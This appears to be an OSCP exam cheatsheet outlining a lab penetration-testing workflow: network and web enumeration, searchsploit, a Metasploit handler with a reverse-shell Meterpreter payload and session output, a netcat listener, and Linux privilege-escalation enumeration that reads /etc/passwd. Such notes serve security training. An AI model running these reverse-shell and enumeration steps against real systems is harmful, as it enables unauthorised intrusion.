# OSCP
OSCP Exam Cheatsheet.

# Index

- [Preparation](#preparation)
- [Recon](#recon) 
- [Preparation](#preparation) 

# Content

### PREPARATION
Kali Wordlists: `/usr/share/wordlists`  
SecLists: https://github.com/danielmiessler/SecLists

Useful Tools:
```bash
$ enum4linux [ target_ip ]	# Enumerate Windows / Samba (SMB) hosts.
```

### RECON
Scan network range for valid IPs/hostnames:  
```bash
i="0"
while [ $i -lt "255" ]
do nslookup 10.11.1.$i 10.11.1.220 | grep -v "NXDOMAIN" | grep name
	i=$[ $i+1 ]
done
```

Nmap port scans:
(NOTE: Heavy scanning may result in ports being filtered/closed - wait <15 minutes to be unbanned)
```bash
$ nmap 10.11.1.71 --top-ports 20 --open	# Top 20 TCP ports scan on initial box
$ nmap 10.11.1.71 -p- -sV		# Complete TCP port scan + service banner grab on each box:
```

For each service, check available Nmap scripts:
```bash
$ ls -l /usr/share/nmap/scripts/*ssh*
```

Summarise your recon findings on the target:
* IP / DNS?
* OS?
* Ports (TCP / UDP)?
* Services / Applications?
* Which is the best entry point so far?
* Prioritised list of attack vectors:
	* Explore the web application.
	* Search for vulnerabilities in the known services & applications.
	* Brute force SSH with common & weak credentials.


### DEEPER RECON (SERVICE-LEVEL) - WEBAPP EXAMPLE

Scripts:
```bash
$ curl -i -L 10.11.1.71 						  # Follow re-directs
$ curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//' # Internal/external links
$ gobuster -u http://10.11.1.71/ \					  # Directory brute-force
	   -w /usr/share/seclists/Discovery/Web_Content/common.txt \
	   -s '200,204,301,302,307,403,500' -e
$ gobuster -u http://10.11.1.71/cgi-bin/ \				  # 2nd directory brute-force
	   -w /usr/share/seclists/Discovery/Web_Content/cgis.txt \
	   -s '200,204,403,500' -e
```

Other things to check:
* robots.txt
* social media
* source code (if app is based on open-source code)

Re-evaluate attack surface:
* Any new findings to add to our list of attack vectors?

### FIND VULNS + EXPLOIT CODE

Tools:
```bash
# Nikto webapp scanner:
$ nikto -host 10.11.1.71

# Searchsploit (exploit-db):
$ searchsploit [options] [search_term1] [search_term2] . . . [search_termN]

# Nmap Scripting ENgine
$ ls -l /usr/share/nmap/scripts/*service_name*
```

Other areas to find exploit code:
* Google Shellshock POC
* Google one-liners from github

If no good attack vectors / exploit can be found, try a different or more comprehensive wordlist for subdirectory brute-forcing or use a webapp scanner to poke harder at the system.

### USING EXPLOIT CODE

Using the public exploit you found + Metasploit Multi-Handler, you can establish a Meterpreter session with the target.

Metasploit Handler usage w/ public exploit:
```bash
# Set up Metasploit Handler (use multi-handler -> set reverse shell payload -> set variables -> run handler)
$ msfconsole
$ msf > use exploit/multi/handler
$ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
$ msf exploit(handler) > set EXITFUNC thread
$ msf exploit(handler) > set LHOST 10.11.0.31
$ msf exploit(handler) > set LPORT 443
$ msf exploit(handler) > run
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.11.0.31:443 

# Execute Public Exploit:
$ python exploit.py [ target_ip ]

# Metasploit Handler (meterpreter session -> background the session -> connect back to session)
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.11.0.31:443 
[*] Sending stage (179267 bytes) to 10.11.1.5
[*] Meterpreter session 0 opened (10.11.0.31:443 -> 10.11.1.5:1199) at 2019-01-07 22:46:33 +1100
meterpreter > help
. . . 
meterpreter > background
msf exploit(ms08_067_netapi) > sessions -i 0
[*] Starting interaction with 0...
meterpreter >
```

Meterpreter sometimes doesn't work.  
Go back to using `nc -nvlp 80` and trigger reverse shell in vulnerable app/service.


### PRIVILEGE ESCALATION - ENUM

Get a proper shell: https://netsec.ws/?p=337
```bash
# This shell mostly works
python -c 'import pty; pty.spawn("/bin/sh")'
```

General privesc guide:
* https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/?st=JOQAMPYP&sh=8899be73

Linux privesc:
* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py
* https://github.com/rebootuser/LinEnum (automated scan)
* https://tools.kali.org/vulnerability-analysis/unix-privesc-check (Kali tool)
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  

Windows privesc:
* https://github.com/azmatt/windowsEnum (automated scan)
* https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
* http://www.fuzzysecurity.com/tutorials/16.html

Questions to ask:
* User RWX permissions enabled on files/directories
* Config.* files
* Custom programs
* SUID / SGID programs
* Cron jobs / scheduled programs or scripts
* Hardcoded credentials -> where are credentials kept?


Privesc Enum:
```bash
# OS? Version? Architecture?
$ cat /etc/*-release
$ uname -i
$ lsb_release -a (Debian)
 
# Who are we? Where are we? What are our sudo privileges?
$ id
$ pwd
$ sudo -l
 
# Other users? Which ones have a valid shell?
$ cat /etc/passwd
$ grep -vE "nologin|false" /etc/passwd
 
# Services running on the box? Network services running?
ps aux
netstat -antup
 
# Whats installed? Kernel?
dpkg -l (Debian)
rpm -qa (CentOS / openSUSE)
uname -a
```

Summarise possible attack vectors / vulnerable services to escalate privileges.

### PRIVILEGE ESCALATION - FINDING EXPLOIT

Use information gathered from enumeration stage to find an exploit for vectors / vulnerable services in your list.





